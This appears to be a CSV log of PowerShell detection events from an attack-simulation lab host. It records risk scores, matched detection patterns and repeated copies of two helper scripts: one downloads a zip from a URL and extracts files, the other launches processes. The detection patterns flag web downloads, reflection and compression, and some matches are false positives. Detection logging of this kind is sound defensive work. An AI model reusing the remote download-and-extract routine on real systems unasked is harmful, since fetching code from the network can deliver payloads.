"timestamp","event_id","risk_score","detected_patterns","pattern_details","command_length","full_command","computer","user_sid","message_number","message_total","matched_patterns"
,,,,,,,,"Unknown",,,
,,,,,,,,"Unknown",,,
,,,,,,,,"Unknown",,,
"12/16/2024 8:34:55 PM","35710695","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:54 PM","35710556","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:56 PM","35710886","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:57 PM","35711074","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:54 PM","35710591","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:55 PM","35710730","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:57 PM","35711109","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
